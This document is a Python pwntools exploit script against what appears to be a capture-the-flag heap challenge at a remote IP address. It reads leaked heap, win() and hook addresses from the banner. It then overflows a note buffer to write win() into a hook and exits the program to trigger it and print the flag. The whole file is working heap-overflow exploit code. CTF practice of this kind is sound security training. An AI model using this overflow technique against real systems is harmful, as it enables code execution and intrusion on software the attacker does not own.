#!/usr/bin/env python3
"""
Test if hook is called on program exit
"""
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap:  0x{heap:x}")
log.success(f"win(): 0x{win:x}")
log.success(f"hook:  0x{hook:x}")

# Calculate offset from heap to hook
offset = hook - heap
log.info(f"Offset from heap to hook: {offset} (0x{offset:x})")

# The hook is at 0x404260 (fixed .bss address)
# Heap is at runtime address
# We need to write win() address to hook

# Strategy: Create a note, use massive overflow to write to hook directly
print("\n[1] Create note at heap")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'32')
io.recvuntil(b':')
io.sendline(b'A' * 32)
response = io.recvuntil(b'>')
# Extract note address
match = re.search(rb'at 0x([0-9a-fA-F]+)', response)
if match:
    note_addr = int(match.group(1), 16)
    log.info(f"Note 0 at: 0x{note_addr:x}")
    
    # Calculate how many bytes to overflow to reach hook
    bytes_to_hook = hook - note_addr
    log.info(f"Need to write {bytes_to_hook} bytes to reach hook")
    
    if bytes_to_hook > 0 and bytes_to_hook < 100000:
        print(f"\n[2] Overflowing {bytes_to_hook} bytes to reach hook")
        io.sendline(b'2')
        io.recvuntil(b':')
        io.sendline(b'0')
        io.recvuntil(b':')
        # Write padding + win() address
        payload = b'B' * (bytes_to_hook - 32 - 8) + p64(win)
        io.sendline(payload[:1000])  # Limit to reasonable size
        io.recvuntil(b'>', timeout=2)
        
        print("[3] Exiting to trigger hook")
        io.sendline(b'5')
        
        output = io.recvall(timeout=3)
        result = output.decode(errors='ignore')
        
        print("\n" + "="*60)
        print(result)
        print("="*60)
        
        if 'ctf7{' in result:
            flag = re.search(r'ctf7\{[^}]+\}', result)
            if flag:
                log.success(f"FLAG: {flag.group(0)}")
    else:
        log.error("Hook is not in reachable range via heap overflow")

io.close()
